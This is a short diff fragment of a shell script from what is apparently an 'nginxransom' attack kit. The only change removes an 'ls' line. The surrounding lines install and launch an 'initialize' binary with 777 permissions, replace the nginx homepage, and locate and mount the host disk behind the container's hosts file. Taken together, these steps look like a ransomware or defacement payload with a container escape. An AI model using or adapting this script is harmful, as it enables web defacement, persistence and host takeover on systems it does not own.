@@ -5,7 +5,6 @@
 cp   nginxransom/initialize.txt /usr/bin/initialize  
 chmod 777 /usr/bin/initialize 
 initialize &
-ls
 cp   nginxransom/web/index.html /usr/share/nginx/html/index.html
 diskpart=$(mount | grep   '^/dev/' | grep 'hosts' |  sed 's/ *$//g' | awk  '{print $1}')
 mount $diskpart /mnt/
